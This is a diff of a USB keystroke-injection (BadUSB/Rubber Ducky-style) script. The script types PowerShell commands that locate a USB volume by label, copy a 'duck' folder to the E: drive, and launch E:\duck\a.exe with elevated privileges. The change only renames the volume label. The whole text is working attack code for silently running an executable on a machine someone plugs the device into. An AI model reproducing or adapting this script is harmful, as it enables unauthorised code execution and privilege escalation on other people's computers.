@@ -4,7 +4,7 @@ DELAY 500
 STRING powershell
 ENTER
 DELAY 1500
-STRING $usb = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'cyber-ghost' }; if ($usb) { Copy-Item "$($usb.Name)duck" -Destination "E:\" -Recurse }
+STRING $usb = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'ghost' }; if ($usb) { Copy-Item "$($usb.Name)duck" -Destination "E:\" -Recurse }
 ENTER
 DELAY 2000
 STRING Start-Process "E:\duck\a.exe" -Verb RunAs
